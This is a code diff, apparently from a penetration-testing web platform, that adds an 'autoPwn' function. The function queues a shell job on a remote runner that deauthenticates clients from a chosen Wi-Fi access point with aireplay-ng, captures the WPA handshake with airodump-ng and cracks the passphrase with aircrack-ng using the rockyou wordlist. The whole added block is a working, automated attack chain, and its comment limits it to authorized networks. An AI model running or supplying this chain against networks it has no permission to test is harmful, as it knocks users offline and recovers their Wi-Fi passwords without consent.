@@ -237,6 +237,41 @@ export async function capturePmkid(formData: FormData) {
 }
 
 /**
+ * One-click full chain for an AP: deauth + capture the handshake, verify it,
+ * then crack it with rockyou — all in a single job. The recovered passphrase
+ * surfaces in the inspect panel's "cracked" banner. Authorized networks only.
+ */
+export async function autoPwn(formData: FormData) {
+  const email = await requireUser();
+  const runnerId = String(formData.get("runnerId") ?? "");
+  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
+  const channel = String(formData.get("channel") ?? "").trim();
+  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
+    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
+  }
+  const chArg = /^\d{1,3}$/.test(channel) ? `-c ${channel} ` : "";
+  const cmd =
+    `bash -lc '${findMonSh()}; rm -f /tmp/rdhs-*; ` +
+    `echo "[1/3] Capturing handshake (deauth + listen, ~2 min)…"; ` +
+    `( sleep 8; for i in 1 2 3 4; do aireplay-ng --deauth 6 -a ${bssid} "$M" >/dev/null 2>&1; sleep 6; done ) & ` +
+    `timeout 130 airodump-ng ${chArg}--bssid ${bssid} -w /tmp/rdhs "$M" >/dev/null 2>&1; ` +
+    `echo "[2/3] Checking for a handshake…"; ` +
+    `if ! aircrack-ng /tmp/rdhs-01.cap 2>/dev/null | grep -Eqi "1 handshake|WPA \\("; then ` +
+    `echo "No handshake captured — retry when a client is connected, or try PMKID."; exit 0; fi; ` +
+    `echo "[3/3] Cracking with rockyou (this can take a while)…"; ` +
+    `W=/usr/share/wordlists/rockyou.txt; [ -f "$W" ] || { [ -f "$W.gz" ] && gunzip -kf "$W.gz"; }; ` +
+    `[ -f "$W" ] || W=$(ls /usr/share/wordlists/*.txt 2>/dev/null | head -1); ` +
+    `if [ -z "$W" ]; then echo "No wordlist found — install wordlists/seclists"; exit 0; fi; ` +
+    `aircrack-ng -w "$W" -b ${bssid} /tmp/rdhs-01.cap'`;
+
+  await prisma.job.create({
+    data: { runnerId, tool: "custom", target: `wifi-crack:${bssid}`, args: cmd, queuedBy: email },
+  });
+  revalidatePath(BACK);
+  redirect(`${BACK}?pwning=1`);
+}
+
+/**
  * Save a WiFi security review as findings on an authorized engagement — turns the
  * assessment into report-ready items (recomputed server-side; one finding per
  * real issue).
